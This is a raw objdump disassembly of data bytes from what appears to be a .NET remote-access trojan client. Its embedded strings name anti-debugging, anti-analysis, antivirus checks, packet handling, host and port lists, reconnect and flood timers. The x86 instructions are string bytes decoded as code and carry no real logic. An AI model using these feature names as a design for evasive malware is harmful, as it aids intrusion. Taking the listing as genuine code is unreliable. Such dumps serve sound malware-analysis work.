  4069e8:	42                   	inc    %edx
  4069e9:	75 66                	jne    0x406a51
  4069eb:	66 65 72 00          	data16 gs jb 0x4069ef
  4069ef:	73 65                	jae    0x406a56
  4069f1:	74 5f                	je     0x406a52
  4069f3:	42                   	inc    %edx
  4069f4:	75 66                	jne    0x406a5c
  4069f6:	66 65 72 00          	data16 gs jb 0x4069fa
  4069fa:	53                   	push   %ebx
  4069fb:	65 74 41             	gs je  0x406a3f
  4069fe:	73 49                	jae    0x406a49
  406a00:	6e                   	outsb  %ds:(%esi),(%dx)
  406a01:	74 65                	je     0x406a68
  406a03:	67 65 72 00          	addr16 gs jb 0x406a07
  406a07:	44                   	inc    %esp
  406a08:	65 74 65             	gs je  0x406a70
  406a0b:	63 74 44 65          	arpl   %esi,0x65(%esp,%eax,2)
  406a0f:	62 75 67             	bound  %esi,0x67(%ebp)
  406a12:	67 65 72 00          	addr16 gs jb 0x406a16
  406a16:	4d                   	dec    %ebp
  406a17:	61                   	popa
  406a18:	6e                   	outsb  %ds:(%esi),(%dx)
  406a19:	61                   	popa
  406a1a:	67 65 6d             	gs insl (%dx),%es:(%di)
  406a1d:	65 6e                	outsb  %gs:(%esi),(%dx)
  406a1f:	74 4f                	je     0x406a70
  406a21:	62 6a 65             	bound  %ebp,0x65(%edx)
  406a24:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  406a28:	61                   	popa
  406a29:	72 63                	jb     0x406a8e
  406a2b:	68 65 72 00 53       	push   $0x53007265
  406a30:	65 73 73             	gs jae 0x406aa6
  406a33:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  406a3a:	6e                   	outsb  %ds:(%esi),(%dx)
  406a3b:	67 45                	addr16 inc %ebp
  406a3d:	76 65                	jbe    0x406aa4
  406a3f:	6e                   	outsb  %ds:(%esi),(%dx)
  406a40:	74 48                	je     0x406a8a
  406a42:	61                   	popa
  406a43:	6e                   	outsb  %ds:(%esi),(%dx)
  406a44:	64 6c                	fs insb (%dx),%es:(%edi)
  406a46:	65 72 00             	gs jb  0x406a49
  406a49:	46                   	inc    %esi
  406a4a:	6c                   	insb   (%dx),%es:(%edi)
  406a4b:	6f                   	outsl  %ds:(%esi),(%dx)
  406a4c:	6f                   	outsl  %ds:(%esi),(%dx)
  406a4d:	64 54                	fs push %esp
  406a4f:	69 6d 65 72 00 43 6c 	imul   $0x6c430072,0x65(%ebp),%ebp
  406a56:	69 65 6e 74 2e 48 65 	imul   $0x65482e74,0x6e(%ebp),%esp
  406a5d:	6c                   	insb   (%dx),%es:(%edi)
  406a5e:	70 65                	jo     0x406ac5
  406a60:	72 00                	jb     0x406a62
  406a62:	54                   	push   %esp
  406a63:	6f                   	outsl  %ds:(%esi),(%dx)
  406a64:	55                   	push   %ebp
  406a65:	70 70                	jo     0x406ad7
  406a67:	65 72 00             	gs jb  0x406a6a
  406a6a:	44                   	inc    %esp
  406a6b:	65 74 65             	gs je  0x406ad3
  406a6e:	63 74 4d 61          	arpl   %esi,0x61(%ebp,%ecx,2)
  406a72:	6e                   	outsb  %ds:(%esi),(%dx)
  406a73:	75 66                	jne    0x406adb
  406a75:	61                   	popa
  406a76:	63 74 75 72          	arpl   %esi,0x72(%ebp,%esi,2)
  406a7a:	65 72 00             	gs jb  0x406a7d
  406a7d:	43                   	inc    %ebx
  406a7e:	75 72                	jne    0x406af2
  406a80:	72 65                	jb     0x406ae7
  406a82:	6e                   	outsb  %ds:(%esi),(%dx)
  406a83:	74 55                	je     0x406ada
  406a85:	73 65                	jae    0x406aec
  406a87:	72 00                	jb     0x406a89
  406a89:	53                   	push   %ebx
  406a8a:	74 72                	je     0x406afe
  406a8c:	65 61                	gs popa
  406a8e:	6d                   	insl   (%dx),%es:(%edi)
  406a8f:	57                   	push   %edi
  406a90:	72 69                	jb     0x406afb
  406a92:	74 65                	je     0x406af9
  406a94:	72 00                	jb     0x406a96
  406a96:	54                   	push   %esp
  406a97:	65 78 74             	gs js  0x406b0e
  406a9a:	57                   	push   %edi
  406a9b:	72 69                	jb     0x406b06
  406a9d:	74 65                	je     0x406b04
  406a9f:	72 00                	jb     0x406aa1
  406aa1:	45                   	inc    %ebp
  406aa2:	6e                   	outsb  %ds:(%esi),(%dx)
  406aa3:	74 65                	je     0x406b0a
  406aa5:	72 00                	jb     0x406aa7
  406aa7:	42                   	inc    %edx
  406aa8:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  406aaf:	72 
  406ab0:	74 65                	je     0x406b17
  406ab2:	72 00                	jb     0x406ab4
  406ab4:	54                   	push   %esp
  406ab5:	6f                   	outsl  %ds:(%esi),(%dx)
  406ab6:	4c                   	dec    %esp
  406ab7:	6f                   	outsl  %ds:(%esi),(%dx)
  406ab8:	77 65                	ja     0x406b1f
  406aba:	72 00                	jb     0x406abc
  406abc:	45                   	inc    %ebp
  406abd:	72 72                	jb     0x406b31
  406abf:	6f                   	outsl  %ds:(%esi),(%dx)
  406ac0:	72 00                	jb     0x406ac2
  406ac2:	4d                   	dec    %ebp
  406ac3:	61                   	popa
  406ac4:	6e                   	outsb  %ds:(%esi),(%dx)
  406ac5:	61                   	popa
  406ac6:	67 65 6d             	gs insl (%dx),%es:(%di)
  406ac9:	65 6e                	outsb  %gs:(%esi),(%dx)
  406acb:	74 4f                	je     0x406b1c
  406acd:	62 6a 65             	bound  %ebp,0x65(%edx)
  406ad0:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  406ad4:	75 6d                	jne    0x406b43
  406ad6:	65 72 61             	gs jb  0x406b3a
  406ad9:	74 6f                	je     0x406b4a
  406adb:	72 00                	jb     0x406add
  406add:	47                   	inc    %edi
  406ade:	65 74 45             	gs je  0x406b26
  406ae1:	6e                   	outsb  %ds:(%esi),(%dx)
  406ae2:	75 6d                	jne    0x406b51
  406ae4:	65 72 61             	gs jb  0x406b48
  406ae7:	74 6f                	je     0x406b58
  406ae9:	72 00                	jb     0x406aeb
  406aeb:	41                   	inc    %ecx
  406aec:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  406af0:	61                   	popa
  406af1:	74 6f                	je     0x406b62
  406af3:	72 00                	jb     0x406af5
  406af5:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  406afa:	00 2e                	add    %ch,(%esi)
  406afc:	63 63 74             	arpl   %esp,0x74(%ebx)
  406aff:	6f                   	outsl  %ds:(%esi),(%dx)
  406b00:	72 00                	jb     0x406b02
  406b02:	4d                   	dec    %ebp
  406b03:	6f                   	outsl  %ds:(%esi),(%dx)
  406b04:	6e                   	outsb  %ds:(%esi),(%dx)
  406b05:	69 74 6f 72 00 43 72 	imul   $0x65724300,0x72(%edi,%ebp,2),%esi
  406b0c:	65 
  406b0d:	61                   	popa
  406b0e:	74 65                	je     0x406b75
  406b10:	44                   	inc    %esp
  406b11:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  406b15:	70 74                	jo     0x406b8b
  406b17:	6f                   	outsl  %ds:(%esi),(%dx)
  406b18:	72 00                	jb     0x406b1a
  406b1a:	43                   	inc    %ebx
  406b1b:	72 65                	jb     0x406b82
  406b1d:	61                   	popa
  406b1e:	74 65                	je     0x406b85
  406b20:	45                   	inc    %ebp
  406b21:	6e                   	outsb  %ds:(%esi),(%dx)
  406b22:	63 72 79             	arpl   %esi,0x79(%edx)
  406b25:	70 74                	jo     0x406b9b
  406b27:	6f                   	outsl  %ds:(%esi),(%dx)
  406b28:	72 00                	jb     0x406b2a
  406b2a:	49                   	dec    %ecx
  406b2b:	6e                   	outsb  %ds:(%esi),(%dx)
  406b2c:	74 50                	je     0x406b7e
  406b2e:	74 72                	je     0x406ba2
  406b30:	00 53 79             	add    %dl,0x79(%ebx)
  406b33:	73 74                	jae    0x406ba9
  406b35:	65 6d                	gs insl (%dx),%es:(%edi)
  406b37:	2e 44                	cs inc %esp
  406b39:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  406b40:	69 63 73 00 4e 61 74 	imul   $0x74614e00,0x73(%ebx),%esp
  406b47:	69 76 65 4d 65 74 68 	imul   $0x6874654d,0x65(%esi),%esi
  406b4e:	6f                   	outsl  %ds:(%esi),(%dx)
  406b4f:	64 73 00             	fs jae 0x406b52
  406b52:	4d                   	dec    %ebp
  406b53:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  406b5a:	74 2e                	je     0x406b8a
  406b5c:	56                   	push   %esi
  406b5d:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  406b64:	73 69                	jae    0x406bcf
  406b66:	63 2e                	arpl   %ebp,(%esi)
  406b68:	44                   	inc    %esp
  406b69:	65 76 69             	gs jbe 0x406bd5
  406b6c:	63 65 73             	arpl   %esp,0x73(%ebp)
  406b6f:	00 53 79             	add    %dl,0x79(%ebx)
  406b72:	73 74                	jae    0x406be8
  406b74:	65 6d                	gs insl (%dx),%es:(%edi)
  406b76:	2e 52                	cs push %edx
  406b78:	75 6e                	jne    0x406be8
  406b7a:	74 69                	je     0x406be5
  406b7c:	6d                   	insl   (%dx),%es:(%edi)
  406b7d:	65 2e 49             	gs cs dec %ecx
  406b80:	6e                   	outsb  %ds:(%esi),(%dx)
  406b81:	74 65                	je     0x406be8
  406b83:	72 6f                	jb     0x406bf4
  406b85:	70 53                	jo     0x406bda
  406b87:	65 72 76             	gs jb  0x406c00
  406b8a:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  406b91:	73 74                	jae    0x406c07
  406b93:	65 6d                	gs insl (%dx),%es:(%edi)
  406b95:	2e 52                	cs push %edx
  406b97:	75 6e                	jne    0x406c07
  406b99:	74 69                	je     0x406c04
  406b9b:	6d                   	insl   (%dx),%es:(%edi)
  406b9c:	65 2e 43             	gs cs inc %ebx
  406b9f:	6f                   	outsl  %ds:(%esi),(%dx)
  406ba0:	6d                   	insl   (%dx),%es:(%edi)
  406ba1:	70 69                	jo     0x406c0c
  406ba3:	6c                   	insb   (%dx),%es:(%edi)
  406ba4:	65 72 53             	gs jb  0x406bfa
  406ba7:	65 72 76             	gs jb  0x406c20
  406baa:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  406bb1:	62 75 67             	bound  %esi,0x67(%ebp)
  406bb4:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  406bbb:	65 
  406bbc:	73 00                	jae    0x406bbe
  406bbe:	45                   	inc    %ebp
  406bbf:	78 70                	js     0x406c31
  406bc1:	61                   	popa
  406bc2:	6e                   	outsb  %ds:(%esi),(%dx)
  406bc3:	64 45                	fs inc %ebp
  406bc5:	6e                   	outsb  %ds:(%esi),(%dx)
  406bc6:	76 69                	jbe    0x406c31
  406bc8:	72 6f                	jb     0x406c39
  406bca:	6e                   	outsb  %ds:(%esi),(%dx)
  406bcb:	6d                   	insl   (%dx),%es:(%edi)
  406bcc:	65 6e                	outsb  %gs:(%esi),(%dx)
  406bce:	74 56                	je     0x406c26
  406bd0:	61                   	popa
  406bd1:	72 69                	jb     0x406c3c
  406bd3:	61                   	popa
  406bd4:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  406bd8:	00 47 65             	add    %al,0x65(%edi)
  406bdb:	74 50                	je     0x406c2d
  406bdd:	72 6f                	jb     0x406c4e
  406bdf:	63 65 73             	arpl   %esp,0x73(%ebp)
  406be2:	73 65                	jae    0x406c49
  406be4:	73 00                	jae    0x406be6
  406be6:	47                   	inc    %edi
  406be7:	65 74 48             	gs je  0x406c32
  406bea:	6f                   	outsl  %ds:(%esi),(%dx)
  406beb:	73 74                	jae    0x406c61
  406bed:	41                   	inc    %ecx
  406bee:	64 64 72 65          	fs fs jb 0x406c57
  406bf2:	73 73                	jae    0x406c67
  406bf4:	65 73 00             	gs jae 0x406bf7
  406bf7:	53                   	push   %ebx
  406bf8:	79 73                	jns    0x406c6d
  406bfa:	74 65                	je     0x406c61
  406bfc:	6d                   	insl   (%dx),%es:(%edi)
  406bfd:	2e 53                	cs push %ebx
  406bff:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  406c03:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  406c0a:	70 
  406c0b:	74 6f                	je     0x406c7c
  406c0d:	67 72 61             	addr16 jb 0x406c71
  406c10:	70 68                	jo     0x406c7a
  406c12:	79 2e                	jns    0x406c42
  406c14:	58                   	pop    %eax
  406c15:	35 30 39 43 65       	xor    $0x65433930,%eax
  406c1a:	72 74                	jb     0x406c90
  406c1c:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  406c23:	73 00                	jae    0x406c25
  406c25:	45                   	inc    %ebp
  406c26:	6e                   	outsb  %ds:(%esi),(%dx)
  406c27:	63 6f 64             	arpl   %ebp,0x64(%edi)
  406c2a:	65 32 42 79          	xor    %gs:0x79(%edx),%al
  406c2e:	74 65                	je     0x406c95
  406c30:	73 00                	jae    0x406c32
  406c32:	52                   	push   %edx
  406c33:	66 63 32             	arpl   %si,(%edx)
  406c36:	38 39                	cmp    %bh,(%ecx)
  406c38:	38 44 65 72          	cmp    %al,0x72(%ebp,%eiz,2)
  406c3c:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%esi),%esi
  406c43:	73 00                	jae    0x406c45
  406c45:	52                   	push   %edx
  406c46:	65 61                	gs popa
  406c48:	64 41                	fs inc %ecx
  406c4a:	6c                   	insb   (%dx),%es:(%edi)
  406c4b:	6c                   	insb   (%dx),%es:(%edi)
  406c4c:	42                   	inc    %edx
  406c4d:	79 74                	jns    0x406cc3
  406c4f:	65 73 00             	gs jae 0x406c52
  406c52:	44                   	inc    %esp
  406c53:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  406c57:	65 46                	gs inc %esi
  406c59:	72 6f                	jb     0x406cca
  406c5b:	6d                   	insl   (%dx),%es:(%edi)
  406c5c:	42                   	inc    %edx
  406c5d:	79 74                	jns    0x406cd3
  406c5f:	65 73 00             	gs jae 0x406c62
  406c62:	47                   	inc    %edi
  406c63:	65 74 41             	gs je  0x406ca7
  406c66:	73 42                	jae    0x406caa
  406c68:	79 74                	jns    0x406cde
  406c6a:	65 73 00             	gs jae 0x406c6d
  406c6d:	47                   	inc    %edi
  406c6e:	65 74 42             	gs je  0x406cb3
  406c71:	79 74                	jns    0x406ce7
  406c73:	65 73 00             	gs jae 0x406c76
  406c76:	43                   	inc    %ebx
  406c77:	53                   	push   %ebx
  406c78:	68 61 72 70 41       	push   $0x41707261
  406c7d:	72 67                	jb     0x406ce6
  406c7f:	75 6d                	jne    0x406cee
  406c81:	65 6e                	outsb  %gs:(%esi),(%dx)
  406c83:	74 49                	je     0x406cce
  406c85:	6e                   	outsb  %ds:(%esi),(%dx)
  406c86:	66 6f                	outsw  %ds:(%esi),(%dx)
  406c88:	46                   	inc    %esi
  406c89:	6c                   	insb   (%dx),%es:(%edi)
  406c8a:	61                   	popa
  406c8b:	67 73 00             	addr16 jae 0x406c8e
  406c8e:	43                   	inc    %ebx
  406c8f:	53                   	push   %ebx
  406c90:	68 61 72 70 42       	push   $0x42707261
  406c95:	69 6e 64 65 72 46 6c 	imul   $0x6c467265,0x64(%esi),%ebp
  406c9c:	61                   	popa
  406c9d:	67 73 00             	addr16 jae 0x406ca0
  406ca0:	65 73 46             	gs jae 0x406ce9
  406ca3:	6c                   	insb   (%dx),%es:(%edi)
  406ca4:	61                   	popa
  406ca5:	67 73 00             	addr16 jae 0x406ca8
  406ca8:	53                   	push   %ebx
  406ca9:	74 72                	je     0x406d1d
  406cab:	69 6e 67 73 00 49 6e 	imul   $0x6e490073,0x67(%esi),%ebp
  406cb2:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  406cb9:	65 
  406cba:	53                   	push   %ebx
  406cbb:	65 74 74             	gs je  0x406d32
  406cbe:	69 6e 67 73 00 53 65 	imul   $0x65530073,0x67(%esi),%ebp
  406cc5:	73 73                	jae    0x406d3a
  406cc7:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  406cce:	6e                   	outsb  %ds:(%esi),(%dx)
  406ccf:	67 45                	addr16 inc %ebp
  406cd1:	76 65                	jbe    0x406d38
  406cd3:	6e                   	outsb  %ds:(%esi),(%dx)
  406cd4:	74 41                	je     0x406d17
  406cd6:	72 67                	jb     0x406d3f
  406cd8:	73 00                	jae    0x406cda
  406cda:	41                   	inc    %ecx
  406cdb:	6e                   	outsb  %ds:(%esi),(%dx)
  406cdc:	74 69                	je     0x406d47
  406cde:	5f                   	pop    %edi
  406cdf:	41                   	inc    %ecx
  406ce0:	6e                   	outsb  %ds:(%esi),(%dx)
  406ce1:	61                   	popa
  406ce2:	6c                   	insb   (%dx),%es:(%edi)
  406ce3:	79 73                	jns    0x406d58
  406ce5:	69 73 00 52 75 6e 41 	imul   $0x416e7552,0x0(%ebx),%esi
  406cec:	6e                   	outsb  %ds:(%esi),(%dx)
  406ced:	74 69                	je     0x406d58
  406cef:	41                   	inc    %ecx
  406cf0:	6e                   	outsb  %ds:(%esi),(%dx)
  406cf1:	61                   	popa
  406cf2:	6c                   	insb   (%dx),%es:(%edi)
  406cf3:	79 73                	jns    0x406d68
  406cf5:	69 73 00 50 61 63 6b 	imul   $0x6b636150,0x0(%ebx),%esi
  406cfc:	73 00                	jae    0x406cfe
  406cfe:	49                   	dec    %ecx
  406cff:	43                   	inc    %ebx
  406d00:	72 65                	jb     0x406d67
  406d02:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  406d05:	74 69                	je     0x406d70
  406d07:	61                   	popa
  406d08:	6c                   	insb   (%dx),%es:(%edi)
  406d09:	73 00                	jae    0x406d0b
  406d0b:	73 65                	jae    0x406d72
  406d0d:	74 5f                	je     0x406d6e
  406d0f:	43                   	inc    %ebx
  406d10:	72 65                	jb     0x406d77
  406d12:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  406d15:	74 69                	je     0x406d80
  406d17:	61                   	popa
  406d18:	6c                   	insb   (%dx),%es:(%edi)
  406d19:	73 00                	jae    0x406d1b
  406d1b:	53                   	push   %ebx
  406d1c:	73 6c                	jae    0x406d8a
  406d1e:	50                   	push   %eax
  406d1f:	72 6f                	jb     0x406d90
  406d21:	74 6f                	je     0x406d92
  406d23:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  406d26:	73 00                	jae    0x406d28
  406d28:	53                   	push   %ebx
  406d29:	79 73                	jns    0x406d9e
  406d2b:	74 65                	je     0x406d92
  406d2d:	6d                   	insl   (%dx),%es:(%edi)
  406d2e:	2e 57                	cs push %edi
  406d30:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  406d37:	46                   	inc    %esi
  406d38:	6f                   	outsl  %ds:(%esi),(%dx)
  406d39:	72 6d                	jb     0x406da8
  406d3b:	73 00                	jae    0x406d3d
  406d3d:	44                   	inc    %esp
  406d3e:	6e                   	outsb  %ds:(%esi),(%dx)
  406d3f:	73 00                	jae    0x406d41
  406d41:	43                   	inc    %ebx
  406d42:	6f                   	outsl  %ds:(%esi),(%dx)
  406d43:	6e                   	outsb  %ds:(%esi),(%dx)
  406d44:	74 61                	je     0x406da7
  406d46:	69 6e 73 00 53 74 72 	imul   $0x72745300,0x73(%esi),%ebp
  406d4d:	69 6e 67 53 70 6c 69 	imul   $0x696c7053,0x67(%esi),%ebp
  406d54:	74 4f                	je     0x406da5
  406d56:	70 74                	jo     0x406dcc
  406d58:	69 6f 6e 73 00 47 65 	imul   $0x65470073,0x6e(%edi),%ebp
  406d5f:	74 49                	je     0x406daa
  406d61:	6d                   	insl   (%dx),%es:(%edi)
  406d62:	61                   	popa
  406d63:	67 65 44             	addr16 gs inc %esp
  406d66:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  406d6a:	65 72 73             	gs jb  0x406de0
  406d6d:	00 52 75             	add    %dl,0x75(%edx)
  406d70:	6e                   	outsb  %ds:(%esi),(%dx)
  406d71:	74 69                	je     0x406ddc
  406d73:	6d                   	insl   (%dx),%es:(%edi)
  406d74:	65 48                	gs dec %eax
  406d76:	65 6c                	gs insb (%dx),%es:(%edi)
  406d78:	70 65                	jo     0x406ddf
  406d7a:	72 73                	jb     0x406def
  406d7c:	00 53 73             	add    %dl,0x73(%ebx)
  406d7f:	6c                   	insb   (%dx),%es:(%edi)
  406d80:	50                   	push   %eax
  406d81:	6f                   	outsl  %ds:(%esi),(%dx)
  406d82:	6c                   	insb   (%dx),%es:(%edi)
  406d83:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  406d8a:	72 73                	jb     0x406dff
  406d8c:	00 73 73             	add    %dh,0x73(%ebx)
  406d8f:	6c                   	insb   (%dx),%es:(%edi)
  406d90:	50                   	push   %eax
  406d91:	6f                   	outsl  %ds:(%esi),(%dx)
  406d92:	6c                   	insb   (%dx),%es:(%edi)
  406d93:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  406d9a:	72 73                	jb     0x406e0f
  406d9c:	00 68 50             	add    %ch,0x50(%eax)
  406d9f:	72 6f                	jb     0x406e10
  406da1:	63 65 73             	arpl   %esp,0x73(%ebp)
  406da4:	73 00                	jae    0x406da6
  406da6:	47                   	inc    %edi
  406da7:	65 74 43             	gs je  0x406ded
  406daa:	75 72                	jne    0x406e1e
  406dac:	72 65                	jb     0x406e13
  406dae:	6e                   	outsb  %ds:(%esi),(%dx)
  406daf:	74 50                	je     0x406e01
  406db1:	72 6f                	jb     0x406e22
  406db3:	63 65 73             	arpl   %esp,0x73(%ebp)
  406db6:	73 00                	jae    0x406db8
  406db8:	49                   	dec    %ecx
  406db9:	50                   	push   %eax
  406dba:	41                   	inc    %ecx
  406dbb:	64 64 72 65          	fs fs jb 0x406e24
  406dbf:	73 73                	jae    0x406e34
  406dc1:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  406dc5:	6f                   	outsl  %ds:(%esi),(%dx)
  406dc6:	6d                   	insl   (%dx),%es:(%edi)
  406dc7:	70 72                	jo     0x406e3b
  406dc9:	65 73 73             	gs jae 0x406e3f
  406dcc:	00 53 79             	add    %dl,0x79(%ebx)
  406dcf:	73 74                	jae    0x406e45
  406dd1:	65 6d                	gs insl (%dx),%es:(%edi)
  406dd3:	2e 4e                	cs dec %esi
  406dd5:	65 74 2e             	gs je  0x406e06
  406dd8:	53                   	push   %ebx
  406dd9:	6f                   	outsl  %ds:(%esi),(%dx)
  406dda:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  406ddd:	74 73                	je     0x406e52
  406ddf:	00 73 65             	add    %dh,0x65(%ebx)
  406de2:	74 5f                	je     0x406e43
  406de4:	41                   	inc    %ecx
  406de5:	72 67                	jb     0x406e4e
  406de7:	75 6d                	jne    0x406e56
  406de9:	65 6e                	outsb  %gs:(%esi),(%dx)
  406deb:	74 73                	je     0x406e60
  406ded:	00 53 79             	add    %dl,0x79(%ebx)
  406df0:	73 74                	jae    0x406e66
  406df2:	65 6d                	gs insl (%dx),%es:(%edi)
  406df4:	45                   	inc    %ebp
  406df5:	76 65                	jbe    0x406e5c
  406df7:	6e                   	outsb  %ds:(%esi),(%dx)
  406df8:	74 73                	je     0x406e6d
  406dfa:	00 50 6f             	add    %dl,0x6f(%eax)
  406dfd:	72 74                	jb     0x406e73
  406dff:	73 00                	jae    0x406e01
  406e01:	45                   	inc    %ebp
  406e02:	78 69                	js     0x406e6d
  406e04:	73 74                	jae    0x406e7a
  406e06:	73 00                	jae    0x406e08
  406e08:	48                   	dec    %eax
  406e09:	6f                   	outsl  %ds:(%esi),(%dx)
  406e0a:	73 74                	jae    0x406e80
  406e0c:	73 00                	jae    0x406e0e
  406e0e:	41                   	inc    %ecx
  406e0f:	6e                   	outsb  %ds:(%esi),(%dx)
  406e10:	74 69                	je     0x406e7b
  406e12:	76 69                	jbe    0x406e7d
  406e14:	72 75                	jb     0x406e8b
  406e16:	73 00                	jae    0x406e18
  406e18:	43                   	inc    %ebx
  406e19:	6f                   	outsl  %ds:(%esi),(%dx)
  406e1a:	6e                   	outsb  %ds:(%esi),(%dx)
  406e1b:	63 61 74             	arpl   %esp,0x74(%ecx)
  406e1e:	00 49 6d             	add    %cl,0x6d(%ecx)
  406e21:	61                   	popa
  406e22:	67 65 46             	addr16 gs inc %esi
  406e25:	6f                   	outsl  %ds:(%esi),(%dx)
  406e26:	72 6d                	jb     0x406e95
  406e28:	61                   	popa
  406e29:	74 00                	je     0x406e2b
  406e2b:	66 6f                	outsw  %ds:(%esi),(%dx)
  406e2d:	72 6d                	jb     0x406e9c
  406e2f:	61                   	popa
  406e30:	74 00                	je     0x406e32
  406e32:	4d                   	dec    %ebp
  406e33:	61                   	popa
  406e34:	6e                   	outsb  %ds:(%esi),(%dx)
  406e35:	61                   	popa
  406e36:	67 65 6d             	gs insl (%dx),%es:(%di)
  406e39:	65 6e                	outsb  %gs:(%esi),(%dx)
  406e3b:	74 42                	je     0x406e7f
  406e3d:	61                   	popa
  406e3e:	73 65                	jae    0x406ea5
  406e40:	4f                   	dec    %edi
  406e41:	62 6a 65             	bound  %ebp,0x65(%edx)
  406e44:	63 74 00 46          	arpl   %esi,0x46(%eax,%eax,1)
  406e48:	6f                   	outsl  %ds:(%esi),(%dx)
  406e49:	72 63                	jb     0x406eae
  406e4b:	65 50                	gs push %eax
  406e4d:	61                   	popa
  406e4e:	74 68                	je     0x406eb8
  406e50:	4f                   	dec    %edi
  406e51:	62 6a 65             	bound  %ebp,0x65(%edx)
  406e54:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  406e58:	6f                   	outsl  %ds:(%esi),(%dx)
  406e59:	6c                   	insb   (%dx),%es:(%edi)
  406e5a:	6c                   	insb   (%dx),%es:(%edi)
  406e5b:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
  406e60:	6f                   	outsl  %ds:(%esi),(%dx)
  406e61:	6e                   	outsb  %ds:(%esi),(%dx)
  406e62:	6e                   	outsb  %ds:(%esi),(%dx)
  406e63:	65 63 74 00 52       	arpl   %esi,%gs:0x52(%eax,%eax,1)
  406e68:	65 63 6f 6e          	arpl   %ebp,%gs:0x6e(%edi)
  406e6c:	6e                   	outsb  %ds:(%esi),(%dx)
  406e6d:	65 63 74 00 47       	arpl   %esi,%gs:0x47(%eax,%eax,1)
  406e72:	65 74 00             	gs je  0x406e75
  406e75:	53                   	push   %ebx
  406e76:	79 73                	jns    0x406eeb
  406e78:	74 65                	je     0x406edf
  406e7a:	6d                   	insl   (%dx),%es:(%edi)
  406e7b:	2e 4e                	cs dec %esi
  406e7d:	65 74 00             	gs je  0x406e80
  406e80:	53                   	push   %ebx
  406e81:	65 74 00             	gs je  0x406e84
  406e84:	54                   	push   %esp
  406e85:	61                   	popa
  406e86:	72 67                	jb     0x406eef
  406e88:	65 74 00             	gs je  0x406e8b
  406e8b:	43                   	inc    %ebx
  406e8c:	6c                   	insb   (%dx),%es:(%edi)
  406e8d:	69 65 6e 74 2e 48 61 	imul   $0x61482e74,0x6e(%ebp),%esp
  406e94:	6e                   	outsb  %ds:(%esi),(%dx)
  406e95:	64 6c                	fs insb (%dx),%es:(%edi)
  406e97:	65 5f                	gs pop %edi
  406e99:	50                   	push   %eax
  406e9a:	61                   	popa
  406e9b:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  406e9e:	74 00                	je     0x406ea0
  406ea0:	4b                   	dec    %ebx
  406ea1:	65 65 70 41          	gs gs jo 0x406ee6
  406ea5:	6c                   	insb   (%dx),%es:(%edi)
  406ea6:	69 76 65 50 61 63 6b 	imul   $0x6b636150,0x65(%esi),%esi
  406ead:	65 74 00             	gs je  0x406eb0
  406eb0:	43                   	inc    %ebx
  406eb1:	6c                   	insb   (%dx),%es:(%edi)
  406eb2:	69 65 6e 74 53 6f 63 	imul   $0x636f5374,0x6e(%ebp),%esp
  406eb9:	6b 65 74 00          	imul   $0x0,0x74(%ebp),%esp
  406ebd:	67 65 74 5f          	addr16 gs je 0x406f20
  406ec1:	4f                   	dec    %edi
  406ec2:	66 66 73 65          	data16 data16 jae 0x406f2b
  406ec6:	74 00                	je     0x406ec8
  406ec8:	73 65                	jae    0x406f2f
  406eca:	74 5f                	je     0x406f2b
  406ecc:	4f                   	dec    %edi
  406ecd:	66 66 73 65          	data16 data16 jae 0x406f36
  406ed1:	74 00                	je     0x406ed3
  406ed3:	53                   	push   %ebx
  406ed4:	70 6c                	jo     0x406f42
  406ed6:	69 74 00 43 6c 69 65 	imul   $0x6e65696c,0x43(%eax,%eax,1),%esi
  406edd:	6e 
  406ede:	74 4f                	je     0x406f2f
  406ee0:	6e                   	outsb  %ds:(%esi),(%dx)
  406ee1:	45                   	inc    %ebp
  406ee2:	78 69                	js     0x406f4d
  406ee4:	74 00                	je     0x406ee6
  406ee6:	53                   	push   %ebx
  406ee7:	61                   	popa
  406ee8:	6c                   	insb   (%dx),%es:(%edi)
  406ee9:	74 00                	je     0x406eeb
  406eeb:	49                   	dec    %ecx
  406eec:	41                   	inc    %ecx
  406eed:	73 79                	jae    0x406f68
  406eef:	6e                   	outsb  %ds:(%esi),(%dx)
  406ef0:	63 52 65             	arpl   %edx,0x65(%edx)
  406ef3:	73 75                	jae    0x406f6a
  406ef5:	6c                   	insb   (%dx),%es:(%edi)
  406ef6:	74 00                	je     0x406ef8
  406ef8:	54                   	push   %esp
  406ef9:	6f                   	outsl  %ds:(%esi),(%dx)
  406efa:	55                   	push   %ebp
